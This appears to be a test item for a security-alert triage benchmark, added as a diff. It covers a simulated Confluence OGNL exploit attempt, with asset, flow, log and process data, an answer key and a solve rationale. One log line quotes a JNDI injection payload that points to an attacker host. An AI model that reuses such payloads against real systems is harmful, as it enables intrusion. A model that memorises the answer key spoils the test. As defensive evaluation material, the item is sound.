@@ -1,0 +1,78 @@
+{
+  "id": "A-1028",
+  "alert": {
+    "src": "203.0.113.239",
+    "dst": "10.2.1.33",
+    "dst_port": 8090,
+    "proto": "tcp",
+    "signature": "ET EXPLOIT Confluence OGNL RCE",
+    "claimed_cve": "CVE-2022-26134",
+    "severity": "medium",
+    "ts": "2026-09-12T06:41:00Z",
+    "flow_id": "f4872"
+  },
+  "world": {
+    "assets": {
+      "10.2.1.33": {
+        "host": "host-10-2-1-33",
+        "os": "linux",
+        "criticality": "high",
+        "owner": "platform-team",
+        "services": {
+          "8090": {
+            "product": "atlassian-confluence",
+            "version": "7.18.2"
+          }
+        },
+        "peers": [
+          "10.2.8.64"
+        ]
+      }
+    },
+    "cves": {
+      "CVE-2022-26134": {
+        "product": "atlassian-confluence",
+        "patched_in": "7.18.1",
+        "exploit_maturity": "weaponized"
+      }
+    },
+    "flows": {
+      "f4872": {
+        "direction": "inbound",
+        "bytes_out": 128,
+        "bytes_in": 340,
+        "duration_s": 1,
+        "state": "RST",
+        "note": "connection reset, no data exfil"
+      }
+    },
+    "logs": {
+      "host-10-2-1-33": [
+        "[host-10-2-1-33] 8090 POST /api/x 403 jndi:ldap://203.0.113.239/a  <- payload rejected",
+        "[host-10-2-1-33] no new child processes"
+      ]
+    },
+    "proc_trees": {
+      "host-10-2-1-33": {
+        "suspicious": false,
+        "tree": "java (steady state, no children)",
+        "persistence": null
+      }
+    },
+    "sessions": [
+      {
+        "src": "203.0.113.239",
+        "dst": "10.2.1.33",
+        "port": 8090,
+        "legit": false
+      }
+    ],
+    "firewall": []
+  },
+  "ground_truth": {
+    "verdict": "FAILED",
+    "action": "monitor"
+  },
+  "adversarial": false,
+  "solve_rationale": "target patched above patched_in; payload rejected; RST, no exfil"
+}
